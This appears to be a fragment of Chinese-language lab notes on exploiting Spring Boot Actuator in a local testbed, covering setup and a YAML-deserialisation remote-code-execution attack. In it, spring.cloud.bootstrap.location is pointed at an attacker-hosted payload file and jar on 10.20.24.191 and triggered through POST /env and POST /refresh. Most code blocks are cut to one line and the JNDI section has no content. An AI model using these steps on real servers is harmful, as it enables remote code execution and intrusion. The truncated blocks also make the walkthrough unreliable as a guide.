### 二、SpringBoot\_Actuator JNDI RCE

#### 1\. 环境搭建

git clone https://github.com/veracode-research/actuator-testbed

启动

```


mvn install
```

通过编译运行,发现监听IP 地址为 127.0.0.1,只能本机访问 百度查找,修改为 0.0.0.0 就好了

查找关键文件

grep -r 'server.address' -n ./

```


./src/main/resources/application.properties:2:server.address=127.0.0.1
```

改为

```


server.port=8090
```

#### 2.重启启动

mvn spring-boot:run

或


### 三、YML RCE 漏洞

通过Spring环境spring.cloud.bootstrap.location 属性修改来实现RCE的方法更可靠

该属性用于加载外部配置并以YAML格式解析它。为了实现这一点，任需要POST /refresh 任意内容触发漏洞。yaml\_payload.yml 文件内容：

```


!!javax.script.ScriptEngineManager \[
```

#### 1.yaml\_payload.jar 制造

代码 https://github.com/artsploit/yaml-payload

![](../Images/5c15247ff2ab80656c44e7bfa0ba74f0.png)

AwesomeScriptEngineFactory.java 部分代码

```


import javax.script.ScriptEngine;
```

ymal\_payload.jar\\artsploit\\AwesomeScriptEngineFactory.java

包含实际的字节码，并在构造函数中带有恶意有效载荷。

ymal\_payload.jar\\services\\javax.script.ScriptEngineFactory

只是一个包含对'artsploit.AwesomeScriptEngineFactory'的完整引用的文本文件， 以便ServiceLoader知道在哪里可以找到该类

内容：artsploit.AwesomeScriptEngineFactory

jar 文件存在到http服务器中

http://10.20.24.191:8090/ymal\_payload.jar

#### 2.Set spring.cloud.bootstrap.location

spring.cloud.bootstrap.location=http://10.20.24.191:8090/yaml\_payload.yml

![](../Images/f400b5120f601bfced92faf02d80fe04.png)

  

```


POST /env HTTP/1.1
```

#### 3.refresh post任意内容，RCE 漏洞触发

![](../Images/01f1fcc4774aaad4cff6c9750a20b55b.png)

```


POST /refresh HTTP/1.1
```
